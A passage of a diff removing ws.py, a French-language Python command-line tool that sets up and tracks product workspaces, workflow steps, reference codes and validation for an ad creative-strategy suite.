@@ -1,1688 +1,309 @@
-# -*- coding: utf-8 -*-
-"""ws.py — the product workspace of the creative-strategy suite.
-
-    python ws.py init   <dossier> --name "Genouillère en bambou" [--mode free|hybrid|paid] [--stage new|established]
-                        [--programme none|accelerateur] [--kind product|digital|webinar] [--path full|stage]
-                        [--market GN:Guinée:GNF:fr:cod ...] [--channels meta,tiktok]
-                        [--shop URL] [--business NOM] [--goal TEXTE] [--budget "15 USD"] [--team TEXTE]
-    python ws.py adopt  <dossier client existant> --name ...   (mêmes options ; ne déplace rien, déduit les étapes faites)
-    python ws.py status <dossier>        où on en est (réécrit aussi COMMENCE-ICI.md)
-    python ws.py next   <dossier>        la prochaine action seulement
-    python ws.py start  <dossier> <étape> --reason "..."   commencer ailleurs (les étapes d'avant passent en « sautée »)
-    python ws.py step   <dossier> <étape> <todo|doing|done|skipped> [--output CHEMIN ...] [--note TEXTE]
-    python ws.py cycle  <dossier> [--from briefs|strategy|research]   ouvrir le cycle de test suivant
-    python ws.py code   <dossier> <AL|TT|IG|YT|CL|CO|C>   réserver le prochain code libre (CO = concurrent)
-    python ws.py log    <dossier> "texte"   ajouter une ligne datée au journal
-    python ws.py set    <dossier> clé=valeur   mode, stage, programme, kind, path, destination (page|quiz), avatars (1–5), channels, goal, budget_daily, team,
-                                               capacity.machine, capacity.claude, accounts.*, brand.*, engines.<tâche>
-    python ws.py overview [<dossier racine>]   tous les produits du dossier : où chacun en est, quoi faire aujourd'hui
-    python ws.py bilan  <dossier>        l'historique du produit, cycle par cycle (deliverables/BILAN.md)
-    python ws.py check  <dossier>        vérifier les fichiers (code 1 s'il y a une erreur)
-    python ws.py repair <dossier>        reconstruire state.yaml (compteurs depuis les fichiers, étapes connues)
-    python ws.py doctor [<dossier>] [--mode M] [--live]   cet ordinateur est-il prêt pour la formule ?
-
-Beyond the standard library only PyYAML is needed (doctor works without it and lists what to install).
-"""
-import argparse
-import datetime as dt
-import importlib.util
-import json
-import os
-import platform
-import re
-import shutil
-import sys
-import urllib.request
-from pathlib import Path
-
-try:
-    sys.stdout.reconfigure(encoding="utf-8")
-    sys.stderr.reconfigure(encoding="utf-8")
-except Exception:
-    pass
-
-try:
-    import yaml
-except ImportError:
-    yaml = None
-
-HERE = Path(__file__).resolve().parent
-FORMAT = 1
-MODES = ("free", "hybrid", "paid")
-STAGES = ("new", "established")
-PROGRAMMES = ("none", "accelerateur")
-from kinds import KINDS  # noqa: E402  (product, webinar: what the project sells)
-STATUSES = ("todo", "doing", "done", "skipped")
-STATUS_FR = {"todo": "à faire", "doing": "en cours", "done": "faite", "skipped": "sautée"}
-REF_PREFIXES = ("AL", "TT", "IG", "YT", "CL")
-CODE_PREFIXES = REF_PREFIXES + ("CO", "C")
-CYCLE_FROM = ("research", "strategy", "briefs")
-AD_STATUSES = ("brief", "production", "review", "ready", "live", "paused", "killed", "winner")
-REF_SUBDIRS = ("AdLibrary", "TikTok", "Instagram", "Transcripts", "Analyses", "Frames")
-WIN = os.name == "nt"
-PY = "python" if WIN else "python3"
-
-
-class WsError(Exception):
-    """An error the user can fix; printed as one French line, never as a traceback."""
-
-
-# ---------------------------------------------------------------- files
-
-def need_yaml():
-    if yaml is None:
-        raise WsError(f"PyYAML manque. Installe-le : {PY} -m pip install pyyaml")
-
-
-def read_text(p):
-    raw = Path(p).read_bytes()
-    for enc in ("utf-8-sig", "cp1252"):
-        try:
-            return raw.decode(enc)
-        except UnicodeDecodeError:
-            continue
-    return raw.decode("latin-1")
-
-
-def load_yaml(p, default=None):
-    p = Path(p)
-    if not p.exists():
-        return default
-    text = read_text(p)
-    try:
-        data = yaml.safe_load(text)
-    except yaml.YAMLError as e:
-        mark = getattr(e, "problem_mark", None)
-        where = f", ligne {mark.line + 1}" if mark else ""
-        hint = " (tabulation interdite en YAML : utilise des espaces)" if "\t" in text else ""
-        raise WsError(f"{p.name}{where} : le fichier n'est pas un YAML valide{hint}. Corrige-le ou restaure "
-                      f"{p.name}.bak s'il existe.")
-    return default if data is None else data
-
-
-def dump_yaml(p, data):
-    p = Path(p)
-    try:
-        if p.exists():
-            shutil.copy2(p, p.with_name(p.name + ".bak"))
-        tmp = p.with_name(p.name + ".tmp")
-        with open(tmp, "w", encoding="utf-8", newline="\n") as f:
-            yaml.safe_dump(data, f, allow_unicode=True, sort_keys=False, width=110)
-        os.replace(tmp, p)
-    except PermissionError:
-        raise WsError(f"{p.name} est verrouillé (ouvert dans un autre programme, OneDrive ou un antivirus). "
-                      "Ferme-le et relance la commande.")
-
-
-def today():
-    return dt.date.today().isoformat()
-
-
-def now():
-    return dt.datetime.now().strftime("%Y-%m-%d %H:%M")
-
-
-_MODES = None
-
-
-def modes_data():
-    global _MODES
-    need_yaml()
-    if _MODES is None:
-        _MODES = load_yaml(HERE / "modes.yaml")
-        if not isinstance(_MODES, dict):
-            raise WsError("modes.yaml est illisible : réinstalle le skill creative-strategist.")
-    return _MODES
-
-
-def step_ids():
-    return [s["id"] for s in modes_data()["steps"]]
-
-
-def step_label(sid):
-    for s in modes_data()["steps"]:
-        if s["id"] == sid:
-            return s.get("label", sid)
-    return sid
-
-
-def paths_of(root, ws=None):
-    root = Path(root).expanduser().resolve()
-    ws = ws or {}
-    custom = (ws.get("paths") or {}) if isinstance(ws, dict) else {}
-    return {"root": root, "workspace": root / "workspace.yaml", "product": root / "product.yaml",
-            "state": root / "state.yaml", "journal": root / "journal.md", "start": root / "COMMENCE-ICI.md",
-            "refs_index": root / "library" / "references.yaml",
-            "refs_dir": root / custom.get("references", "References"),
-            "plan": (root / custom["plan"]) if custom.get("plan") else None}
-
-
-def new_state():
-    return {"cycle": 1, "counters": {k: 0 for k in CODE_PREFIXES},
-            "steps": {s: {"status": "todo"} for s in step_ids()}, "effective_engines": {}, "next": ""}
-
-
-def as_int(v, what):
-    try:
-        return int(v)
-    except (TypeError, ValueError):
-        raise WsError(f"state.yaml : {what} vaut « {v} », il faut un nombre. Lance : ws.py repair <dossier>")
-
-
-def normalise_state(state):
-    if not isinstance(state, dict):
-        raise WsError("state.yaml n'a pas la bonne forme. Lance : ws.py repair <dossier>")
-    if not isinstance(state.get("steps"), dict):
-        raise WsError("state.yaml n'a plus la liste des étapes. Lance : ws.py repair <dossier>")
-    state["cycle"] = as_int(state.get("cycle", 1), "cycle")
-    counters = state.get("counters") if isinstance(state.get("counters"), dict) else {}
-    state["counters"] = {k: as_int(counters.get(k, 0), f"counters.{k}") for k in CODE_PREFIXES}
-    for s in step_ids():
-        info = state["steps"].get(s)
-        if not isinstance(info, dict):
-            state["steps"][s] = {"status": "todo"}
-    if not isinstance(state.get("effective_engines"), dict):
-        state["effective_engines"] = {}
-    return state
-
-
-def open_ws(folder):
-    need_yaml()
-    P = paths_of(folder)
-    if not P["workspace"].exists():
-        raise WsError(f"pas de workspace.yaml dans {P['root']}. Crée-le avec : ws.py init \"{P['root']}\" --name …")
-    ws = load_yaml(P["workspace"], {})
-    if not isinstance(ws, dict):
-        raise WsError("workspace.yaml n'a pas la bonne forme (il faut des « clé: valeur »). Restaure workspace.yaml.bak.")
-    P = paths_of(folder, ws)
-    if not P["state"].exists() or not read_text(P["state"]).strip():
-        raise WsError("state.yaml est absent ou vide. Lance : ws.py repair <dossier> (les compteurs sont "
-                      "recalculés depuis les fichiers).")
-    state = normalise_state(load_yaml(P["state"]))
-    return P, ws, state
-
-
-def journal(P, text):
-    new = not P["journal"].exists()
-    try:
-        with open(P["journal"], "a", encoding="utf-8", newline="\n") as f:
-            if new:
-                f.write("# Journal\n\nChaque décision et chaque consigne, datée. On ajoute, on n'efface jamais.\n\n")
-            who = os.environ.get("CS_USER", "").strip()
-            f.write(f"- {now()} — " + (f"[{who}] " if who else "") + f"{text}\n")
-    except PermissionError:
-        raise WsError("journal.md est verrouillé (ouvert ailleurs, OneDrive, antivirus). Ferme-le et relance.")
-
-
-ROLES = {"strategist": "stratège", "editor": "monteur", "creator": "créateur de contenu", "buyer": "media buyer",
-         "owner": "propriétaire", "closer": "appels et WhatsApp"}
-
-
-def members(ws):
-    m = ws.get("members")
-    return [x for x in m if isinstance(x, dict) and x.get("name")] if isinstance(m, list) else []
-
-
-def cmd_team(a):
-    P, ws, state = open_ws(a.folder)
-    team = members(ws)
-    if a.action == "add":
-        if not a.name:
-            raise WsError("donne le nom : ws.py team <dossier> add \"Awa\" --role editor")
-        if a.role and a.role not in ROLES:
-            raise WsError(f"rôle « {a.role} » : {', '.join(f'{k} ({v})' for k, v in ROLES.items())}")
-        team = [x for x in team if x["name"].lower() != a.name.lower()]
-        team.append({"name": a.name, "role": a.role or "", "contact": a.contact or ""})
-        ws["members"] = team
-        dump_yaml(P["workspace"], ws)
-        journal(P, f"Équipe : {a.name}" + (f" ({ROLES[a.role]})" if a.role else "") + " ajouté(e)")
-    elif a.action == "remove":
-        left = [x for x in team if x["name"].lower() != str(a.name or "").lower()]
-        if len(left) == len(team):
-            raise WsError(f"« {a.name} » n'est pas dans l'équipe")
-        ws["members"] = left
-        dump_yaml(P["workspace"], ws)
-        journal(P, f"Équipe : {a.name} retiré(e)")
-        team = left
-    if not team:
-        print("Pas encore d'équipe : ws.py team <dossier> add \"Awa\" --role editor --contact \"+229…\"")
-        return
-    print(f"L'équipe de {ws.get('name')} :")
-    for x in team:
-        print(f"  · {x['name']}" + (f" — {ROLES.get(x.get('role'), x.get('role'))}" if x.get("role") else "")
-              + (f" — {x['contact']}" if x.get("contact") else ""))
-    print("Chacun écrit son nom dans le journal : CS_USER=Awa (variable d'environnement) avant de lancer un skill.")
-
-
-def parse_market(s):
-    parts = (s.split(":") + ["", "", "", "", ""])[:5]
-    code, country, currency, lang, pay = [p.strip() for p in parts]
-    if not re.fullmatch(r"[A-Z]{2}", code or ""):
-        raise WsError(f"marché « {s} » : le code pays doit faire deux lettres majuscules (ex. GN:Guinée:GNF:fr:cod)")
-    # mobile: Orange Money, Wave, MTN MoMo — how a training or a service is paid in West Africa (01/11/2026)
-    if pay and pay not in ("cod", "online", "both", "mobile"):
-        raise WsError(f"marché « {s} » : paiement « {pay} » inconnu (cod, online, both, mobile)")
-    return {"code": code, "country": country, "currency": currency, "language": lang or "fr", "payment": pay or "cod"}
-
-
-# ---------------------------------------------------------------- codes
-
-CODE_IN_NAME = re.compile(r"^(AL|TT|IG|YT|CL|CO)(\d{1,4})(?=[_.\- ]|$)", re.I)
-
-
-def scan_codes(P, ws):
-    """Highest number already used per prefix, from files and indexes (so a code is never reused)."""
-    top = {k: 0 for k in CODE_PREFIXES}
-    roots = [P["refs_dir"], P["root"] / "library"]
-    for r in roots:
-        if r.exists():
-            for f in r.rglob("*"):
-                m = CODE_IN_NAME.match(f.name)
-                if m:
-                    pre = m.group(1).upper()
-                    top[pre] = max(top[pre], int(m.group(2)))
-    refs = (load_yaml(P["refs_index"], {}) or {}) if P["refs_index"].exists() else {}
-    for r in (refs.get("references") or []) if isinstance(refs, dict) else []:
-        m = re.fullmatch(r"(AL|TT|IG|YT|CL)(\d+)", str((r or {}).get("code", "")) if isinstance(r, dict) else "")
-        if m:
-            top[m.group(1)] = max(top[m.group(1)], int(m.group(2)))
-    comp = P["root"] / "library" / "competitors.yaml"
-    data = (load_yaml(comp, {}) or {}) if comp.exists() else {}
-    for c in (data.get("competitors") or []) if isinstance(data, dict) else []:
-        m = re.fullmatch(r"CO(\d+)", str((c or {}).get("code", "")) if isinstance(c, dict) else "")
-        if m:
-            top["CO"] = max(top["CO"], int(m.group(1)))
-    cyc = P["root"] / "cycles"
-    for f in list(cyc.glob("*/ads.yaml")) + list(cyc.glob("*/plan.yaml")) + list(cyc.glob("*/strategy.yaml")):
-        for m in re.finditer(r"\bC(\d{2,4})\b", read_text(f)):
-            top["C"] = max(top["C"], int(m.group(1)))
-    if P["plan"] and P["plan"].exists():  # legacy plans number creatives with "n:"
-        text = read_text(P["plan"])
-        block = text.split("\ncreatives:", 1)[1] if "\ncreatives:" in text else ""
-        for m in re.finditer(r"^- n:\s*(\d+)", block, re.M):
-            top["C"] = max(top["C"], int(m.group(1)))
-    return top
-
-
-# ---------------------------------------------------------------- next action, economics, start page
-
-def missing_facts(ws, product):
-    out = []
-    src = product.get("source") if isinstance(product.get("source"), dict) else {}
-    live = (ws or {}).get("kind") == "webinar"
-    # 1.6: a product not yet online has its offer in notes or a working page (source.notes, source.online: false)
-    if not src.get("url") and not (src.get("online") is False and (src.get("notes") or src.get("page"))):
-        out.append("product.yaml : l'adresse de la page " + ("d'inscription au live" if live else "produit") + " (source.url ; "
-                   "pas encore en ligne : source.online: false et source.notes, la page de travail où l'offre est décidée)")
-    if not product.get("offers"):
-        out.append("product.yaml : " + ("le prix du programme vendu pendant le live" if live else "le prix et l'offre")
-                   + ", par marché (offers)")
-    if not ws.get("markets"):
-        out.append("workspace.yaml : au moins un marché (markets)")
-    accounts = ws.get("accounts") if isinstance(ws.get("accounts"), dict) else {}
-    if ws.get("stage") == "established" and "meta" in (ws.get("channels") or []) and not accounts.get("meta_ad_account_id"):
-        out.append("workspace.yaml : l'identifiant du compte publicitaire Meta (accounts.meta_ad_account_id)")
-    return out
-
-
-def load_product(P):
-    product = load_yaml(P["product"], {}) or {}
-    if not isinstance(product, dict):
-        raise WsError("product.yaml n'a pas la bonne forme (il faut des « clé: valeur »). Restaure product.yaml.bak.")
-    return product
-
-
-def breakeven(product, ws=None):
-    """Max ad cost per order placed (or per sign-up for a webinar), to break even: see economics.py."""
-    sys.path.insert(0, str(HERE))
-    import economics
-    return economics.one_line(product, (ws or {}).get("kind") or "product")
-
-
-PATHS = ("full", "stage")
-DESTINATIONS = ("page", "quiz")   # where the ads lead (1.6): a page, or a quiz that ends on the offer
-PATH_FR = {"full": "parcours complet", "stage": "parcours par étape"}
-BOOK_STEPS = ("intake", "offer", "research", "strategy", "briefs")
-BOOK_LABELS = {"intake": "Le point de départ", "offer": "L'offre et la page", "research": "La recherche",
-               "strategy": "La stratégie", "briefs": "Les briefs"}
-STEP_DOC = {"intake": "FICHE-ENTREE", "offer": "OFFRE", "research": "RECHERCHE", "strategy": "STRATEGIE",
-            "briefs": "BRIEFS", "production": "PRODUCTION", "review": "CONTROLE", "launch": "LANCEMENT",
-            "read": "LECTURE", "iterate": "VARIATIONS"}
-BOOK_NAMES = ("STRATEGIE-CREATIVE", "CREATIVE-STRATEGY")   # docs.py, French and English
-
-
-def path_of(ws):
-    """full: the first cycle ends with ONE document, the strategy book, rebuilt after each of its five steps.
-    stage: each step gives its own document. Absent = full."""
-    return ws.get("path") if ws.get("path") in PATHS else "full"
-
-
-def book_mode(ws, state):
-    """True while the book is THE deliverable: full path, in the first cycle or in a cycle that redoes the research or
-    the strategy (a new strategy = a new complete document). A cycle of variations has one document per step."""
-    if path_of(ws) != "full":
-        return False
-    return int(state.get("cycle") or 1) == 1 or state.get("cycle_from") in ("research", "strategy")
-
-
-def book_status(P):
-    """The strategy book: which of its five parts exist, its file, and whether a part changed after it was bound."""
-    src = P["root"] / "deliverables"
-    parts = {s: src / f"{STEP_DOC[s]}.md" for s in BOOK_STEPS}
-    have = [s for s, f in parts.items() if f.exists()]
-    book = next((src / "word" / f"{n}.docx" for n in BOOK_NAMES if (src / "word" / f"{n}.docx").exists()), None)
-    newest = max((parts[s].stat().st_mtime for s in have), default=0)
-    return {"have": have, "book": book, "stale": bool(have) and (book is None or book.stat().st_mtime < newest)}
-
-
-def docs_cmd(P, *args):
-    return f'{PY} "{HERE / "docs.py"}" "{P["root"]}"' + "".join(f" {x}" for x in args)
-
-
-def compute_next(ws, product, state, P=None):
-    for s in modes_data()["steps"]:
-        st = state["steps"].get(s["id"], {}).get("status", "todo")
-        if st in ("done", "skipped"):
-            continue
-        if P is not None and s["id"] not in BOOK_STEPS and book_mode(ws, state):
-            bs = book_status(P)
-            if bs["stale"]:
-                return ("Relier le document complet avant la production : " + docs_cmd(P, "--book")
-                        + " → deliverables/word/STRATEGIE-CREATIVE.docx et .pdf. Donne les deux fichiers à l'utilisateur.")
-        verb = "Continuer" if st == "doing" else "Commencer"
-        if s["id"] == "intake":
-            miss = missing_facts(ws, product)
-            if miss:
-                return f"{verb} « {s['label']} » : il manque {'; '.join(miss)}."
-        how = f"skill {s['skill']}" if s.get("available") else \
-            f"le skill {s['skill']} n'existe pas encore ; en attendant : {s['interim']}"
-        return f"{verb} l'étape « {s['label']} » ({s['id']}) du cycle {state['cycle']} — {how}."
-    return (f"Cycle {state['cycle']} terminé. Ouvre le suivant : ws.py cycle <dossier> "
-            "(par défaut il repart des briefs, avec les variations des gagnantes).")
-
-
-def write_start_page(P, ws, product, state):
-    md = modes_data()
-    icons = {"todo": "⬜", "doing": "🟨", "done": "✅", "skipped": "⏭️"}
-    cap = ws.get("capacity") if isinstance(ws.get("capacity"), dict) else {}
-    lines = [f"# {ws.get('name', 'Produit')} — commence ici", "",
-             f"Formule **{ws.get('mode')}** · produit **{'neuf' if ws.get('stage') == 'new' else 'avec historique'}**"
-             f" · programme **{ws.get('programme')}**"
-             + (f" · type **{ws.get('kind')}**" if ws.get("kind", "product") != "product" else "")
-             + (" · les pubs mènent à un **quiz**" if ws.get("destination") == "quiz" else "")
-             + f" · cycle **{state['cycle']}**"
-             f" · machine **{cap.get('machine', 'own-pc')}** · Claude **{cap.get('claude', 'pro')}**", "",
-             "## La prochaine action", "", state["next"], ""]
-    lines += ["## Ton document", ""]
-    bs = book_status(P)
-    if book_mode(ws, state):
-        lines.append("**Parcours complet** : un seul document, ta stratégie créative complète (le point de départ, "
-                     "l'offre, la recherche, la stratégie, les briefs), relié en une fois quand les briefs sont faits "
-                     "(deliverables/word/STRATEGIE-CREATIVE.pdf). Ensuite, chaque étape a son document, l'un après "
-                     "l'autre : production, contrôle, lancement, lecture, variations.")
-        lines.append("")
-        lines.append(" · ".join(f"{'✅' if s in bs['have'] else '⬜'} {BOOK_LABELS[s]}" for s in BOOK_STEPS))
-        lines.append("")
-        if bs["book"] is None:
-            lines.append("- Pas encore relié." if not bs["have"] else
-                         f"- À relier : {docs_cmd(P, '--book')}")
-        else:
-            when = dt.datetime.fromtimestamp(bs["book"].stat().st_mtime).strftime("%d/%m/%Y %H:%M")
-            lines.append(f"- Relié le {when}, {len(bs['have'])} partie(s) sur 5"
-                         + (" ; une partie a changé depuis : à relier." if bs["stale"] else "."))
-    else:
-        why = (" (un cycle de variations : le document complet est déjà fait, chaque étape a le sien)"
-               if path_of(ws) == "full" else "")
-        lines.append(f"**Parcours par étape**{why} : chaque étape a son document, dans deliverables/word/ "
-                     "(LANCEMENT, LECTURE, VARIATIONS…). Le document complet se relie quand tu veux : "
-                     f"{docs_cmd(P, '--book')}")
-    lines.append("")
-    if ws.get("goal") or ws.get("budget_daily") or ws.get("team"):
-        lines += ["## Le cadre", ""]
-        if ws.get("goal"):
-            lines.append(f"- Objectif : {ws['goal']}")
-        if ws.get("budget_daily"):
-            lines.append(f"- Budget de test par jour : {ws['budget_daily']}")
-        if ws.get("team"):
-            lines.append(f"- Qui produit les vidéos : {ws['team']}")
-        lines.append("")
-    be = breakeven(product, ws)
-    if be:
-        lines += ["## Le point d'équilibre", "", f"- {be}", ""]
-    lines += [f"## Les étapes du cycle {state['cycle']}", ""]
-    for s in md["steps"]:
-        info = state["steps"].get(s["id"], {})
-        st = info.get("status", "todo")
-        when = f" ({info['date']})" if info.get("date") else ""
-        lines.append(f"- {icons.get(st, '⬜')} {s['label']} — {STATUS_FR.get(st, st)}{when}")
-    miss = missing_facts(ws, product)
-    if miss:
-        lines += ["", "## Ce qu'il manque", ""] + [f"- {m}" for m in miss]
-    eff = state.get("effective_engines") or {}
-    lines += ["", "## Les outils", ""]
-    if not eff:
-        lines.append("- Pas encore vérifiés sur cet ordinateur : lance « ws.py doctor <dossier> ».")
-    else:
-        for task, engine in eff.items():
-            label = md["engines"].get(engine, {}).get("label", engine)
-            lines.append(f"- {md['tasks'].get(task, task)} : {label}")
-        lines.append(f"- (vérifié le {state.get('engines_checked_on', '?')})")
-    if P["journal"].exists():
-        tail = [l for l in read_text(P["journal"]).splitlines() if l.startswith("- ")][-5:]
-        if tail:
-            lines += ["", "## Les dernières décisions (journal.md)", ""] + tail
-    try:
-        P["start"].write_text("\n".join(lines) + "\n", encoding="utf-8", newline="\n")
-    except PermissionError:
-        raise WsError("COMMENCE-ICI.md est ouvert dans un autre programme : ferme-le et relance.")
-
-
-def refresh(P, ws, state):
-    product = load_product(P)
-    state["next"] = compute_next(ws, product, state, P)
-    dump_yaml(P["state"], state)
-    write_start_page(P, ws, product, state)
-    return state["next"]
-
-
-# ---------------------------------------------------------------- commands
-
-def make_tree(root, adopt_paths):
-    dirs = ["library/voice", "data/exports", "data/screenshots", "data/deliveries", "deliverables"]
-    if "references" not in adopt_paths:
-        dirs += [f"References/{d}" for d in REF_SUBDIRS]
-    dirs += [f"cycles/cycle-01/{d}" for d in ("briefs", "creatives", "launch", "results")]
-    for d in dirs:
-        (root / d).mkdir(parents=True, exist_ok=True)
-
-
-def new_cycle_files(root, n):
-    ads = root / "cycles" / f"cycle-{n:02d}" / "ads.yaml"
-    if not ads.exists():
-        dump_yaml(ads, {"cycle": n, "ads": []})
-
-
-def cmd_init(a, adopt=False):
-    need_yaml()
-    root = Path(a.folder).expanduser().resolve()
-    if adopt and not root.is_dir():
-        raise WsError(f"le dossier à adopter n'existe pas : {root}")
-    if (root / "workspace.yaml").exists():
-        raise WsError(f"un workspace existe déjà ici : {root / 'workspace.yaml'}")
-    markets = [parse_market(m) for m in (a.market or [])]  # checked before anything is created
-    root.mkdir(parents=True, exist_ok=True)
-    paths, inferred, programme = {}, [], a.programme
-    if adopt:
-        if (root / "References").is_dir():
-            paths["references"] = "References"
-        for plan in ("plan.yaml", "plan_migrated.yaml"):
-            if (root / plan).exists():
-                paths["plan"] = plan
-                break
-        if (root / "References" / "REFERENCES_LOG.xlsx").exists():
-            paths["references_log"] = "References/REFERENCES_LOG.xlsx"
-        if programme is None and list(root.glob("CONTRAT-ACCOMPAGNEMENT*")):
-            programme = "accelerateur"
-            inferred.append("programme accelerateur (contrat d'accompagnement trouvé)")
-    programme = programme or "none"
-    make_tree(root, paths)
-    (root / "library" / "competitors").mkdir(parents=True, exist_ok=True)
-    ws = {"format": FORMAT, "name": a.name, "business": a.business or "", "language": "fr",
-          "mode": a.mode, "programme": programme, "kind": a.kind, "stage": a.stage,
-          "path": a.path or ("stage" if adopt else "full"),
-          "channels": [c.strip() for c in a.channels.split(",") if c.strip()],
-          "markets": markets, "goal": a.goal or "", "budget_daily": a.budget or "", "team": a.team or "",
-          "capacity": {"machine": "own-pc", "claude": "pro"},
-          "accounts": {"shop_url": a.shop or "", "meta_ad_account_id": "", "meta_page": "", "tiktok_account": ""},
-          "brand": {"name": "", "primary_color": "", "accent_color": ""},
-          "engines": {}, "paths": paths}
-    P = paths_of(root, ws)
-    dump_yaml(P["workspace"], ws)
-    if not P["product"].exists():
-        dump_yaml(P["product"], {"source": {"url": a.shop or "", "read_on": ""}, "name": a.name, "promise": "",
-                                 "offers": [], "variants": [], "proof": [],
-                                 "economics": {"currency": "", "unit_cost": "", "shipping_cost": "",
-                                               "confirmation_rate": "", "delivery_rate": ""},
-                                 "baseline": {}, "constraints": []})
-    lib = {"references.yaml": {"references": []}, "avatars.yaml": {"avatars": []}, "blocks.yaml": {"blocks": []},
-           "competitors.yaml": {"competitors": []}}
-    for f, data in lib.items():
-        fp = root / "library" / f
-        if not fp.exists():
-            fp.parent.mkdir(parents=True, exist_ok=True)
-            dump_yaml(fp, data)
-    new_cycle_files(root, 1)
-    state = new_state()
-    found = scan_codes(P, ws)
-    state["counters"] = {k: max(state["counters"][k], found[k]) for k in CODE_PREFIXES}
-    if adopt:
-        refs_media = P["refs_dir"].exists() and any(CODE_IN_NAME.match(f.name) for f in P["refs_dir"].rglob("*"))
-        if refs_media:
-            state["steps"]["research"] = {"status": "done", "date": today()}
-            inferred.append("références trouvées → research faite")
-        if paths.get("plan"):
-            for s in ("strategy", "briefs"):
-                state["steps"][s] = {"status": "done", "date": today(), "outputs": [paths["plan"]]}
-            inferred.append(f"{paths['plan']} trouvé → strategy et briefs faites")
-        if list(root.glob("FICHE DE LANCEMENT*")):
-            for s in ("production", "review", "launch"):
-                state["steps"][s] = {"status": "done", "date": today()}
-            inferred.append("fiche de lancement trouvée → production, review et launch faites")
-        if any(state["steps"][s]["status"] == "done" for s in step_ids()):
-            state["steps"]["intake"] = {"status": "doing", "date": today()}
-            inferred.append("intake en cours : product.yaml à remplir depuis la page en ligne")
-    journal(P, ("Workspace adopté (rien déplacé)" if adopt else "Workspace créé")
-            + f" : formule {a.mode}, produit {a.stage}, programme {programme}, {PATH_FR[ws['path']]}"
-            + (f", type {a.kind}" if a.kind != "product" else "") + "."
-            + (" Déduit : " + "; ".join(inferred) + "." if inferred else "")
-            + (" Compteurs repris des fichiers : " + ", ".join(f"{k}{v:02d}" for k, v in found.items() if v) + "."
-               if any(found.values()) else ""))
-    nxt = refresh(P, ws, state)
-    print(f"Workspace prêt : {root}")
-    for i in inferred:
-        print(f"  déduit : {i}")
-    print(f"Prochaine action : {nxt}")
-
-
-def cmd_status(a):
-    P, ws, state = open_ws(a.folder)
-    refresh(P, ws, state)
-    print(read_text(P["start"]))
-
-
-def cmd_next(a):
-    P, ws, state = open_ws(a.folder)
-    print(refresh(P, ws, state))
-
-
-def validate(P, ws, state):
-    errors, warnings = [], []
-    for k in ("format", "name", "mode", "programme", "stage", "channels", "markets"):
-        if k not in ws:
-            errors.append(f"workspace.yaml : clé « {k} » absente")
-    if not str(ws.get("name", "")).strip():
-        errors.append("workspace.yaml : le nom du produit est vide")
-    if ws.get("format") not in (None, FORMAT):
-        errors.append(f"workspace.yaml : format {ws.get('format')} inconnu (attendu {FORMAT})")
-    for key, allowed in (("mode", MODES), ("stage", STAGES), ("programme", PROGRAMMES), ("kind", KINDS),
-                         ("path", PATHS), ("destination", DESTINATIONS)):
-        if key in ("kind", "path", "destination") and key not in ws:  # absent = product (before 1.2), full path (before 1.3.2)
-            continue
-        if ws.get(key) not in allowed:
-            errors.append(f"workspace.yaml : {key} « {ws.get(key)} » inconnu ({', '.join(allowed)})")
-    if not isinstance(ws.get("channels", []), list):
-        errors.append("workspace.yaml : channels doit être une liste, ex. [meta, tiktok]")
-    else:
-        for ch in ws.get("channels") or []:
-            if ch not in ("meta", "tiktok"):
-                warnings.append(f"workspace.yaml : canal « {ch} » non géré (meta, tiktok)")
-    markets = ws.get("markets") or []
-    if not isinstance(markets, list):
-        errors.append("workspace.yaml : markets doit être une liste")
-        markets = []
-    for i, m in enumerate(markets):
-        if not isinstance(m, dict):
-            errors.append(f"workspace.yaml : marché n°{i + 1} doit avoir code, country, currency… (pas « {m} »)")
-            continue
-        if not re.fullmatch(r"[A-Z]{2}", str(m.get("code", ""))):
-            errors.append(f"workspace.yaml : marché n°{i + 1} sans code pays à deux lettres")
-        if not m.get("currency"):
-            warnings.append(f"workspace.yaml : marché {m.get('code')} sans devise")
-    md = modes_data()
-    engines = ws.get("engines") or {}
-    if not isinstance(engines, dict):
-        errors.append("workspace.yaml : engines doit être de la forme {tâche: outil}")
-        engines = {}
-    for task, engine in engines.items():
-        if task not in md["tasks"]:
-            errors.append(f"workspace.yaml : engines.{task} n'est pas une tâche connue ({', '.join(md['tasks'])})")
-        elif engine not in md["engines"]:
-            errors.append(f"workspace.yaml : engines.{task} = « {engine} » n'est pas un outil connu")
-    for key, rel in (ws.get("paths") or {}).items():
-        if not (P["root"] / rel).exists():
-            errors.append(f"workspace.yaml : paths.{key} pointe vers « {rel} », introuvable")
-    product = load_product(P)
-    for s, info in state["steps"].items():
-        if s not in step_ids():
-            warnings.append(f"state.yaml : étape « {s} » qui n'existe plus ; « ws.py repair » la retire")
-            continue
-        if info.get("status") not in STATUSES:
-            errors.append(f"state.yaml : statut « {info.get('status')} » invalide pour {s}")
-        for out in info.get("outputs") or []:
-            if not (P["root"] / out).exists():
-                warnings.append(f"state.yaml : la sortie « {out} » de l'étape {s} est introuvable")
-    intake = state["steps"].get("intake", {}).get("status")
-    miss = missing_facts(ws, product)
-    if intake == "done" and miss:
-        errors.append("intake marqué fait mais il manque : " + "; ".join(miss))
-    elif intake == "skipped" and miss:
-        warnings.append("intake sautée alors qu'il manque : " + "; ".join(miss))
-    refs = load_yaml(P["refs_index"], {}) or {}
-    refs = refs.get("references") if isinstance(refs, dict) else None
-    if refs is not None and not isinstance(refs, list):
-        errors.append("library/references.yaml : « references » doit être une liste")
-        refs = []
-    seen = set()
-    for r in refs or []:
-        if not isinstance(r, dict):
-            errors.append(f"library/references.yaml : entrée « {r} » sans clés (il faut code, url, file…)")
-            continue
-        code = str(r.get("code", ""))
-        if not re.fullmatch(r"(AL|TT|IG|YT|CL)\d{2,}", code):
-            errors.append(f"library/references.yaml : code « {code} » invalide (AL01, TT12…)")
-        if code in seen:
-            errors.append(f"library/references.yaml : code {code} en double")
-        seen.add(code)
-        f = r.get("file")
-        if f and not any((base / f).exists() for base in (P["refs_dir"], P["root"])) \
-                and not list(P["refs_dir"].rglob(Path(str(f)).name)):
-            warnings.append(f"library/references.yaml : fichier de {code} introuvable ({f})")
-        if not r.get("url"):
-            warnings.append(f"library/references.yaml : {code} sans lien d'origine")
-    comp = load_yaml(P["root"] / "library" / "competitors.yaml", {}) or {}
-    comps = comp.get("competitors") if isinstance(comp, dict) else None
-    if comps is not None and not isinstance(comps, list):
-        errors.append("library/competitors.yaml : « competitors » doit être une liste")
-        comps = []
-    seen_co = set()
-    for c in comps or []:
-        if not isinstance(c, dict):
-            errors.append(f"library/competitors.yaml : entrée « {c} » sans clés (il faut code, page_url…)")
-            continue
-        code = str(c.get("code", ""))
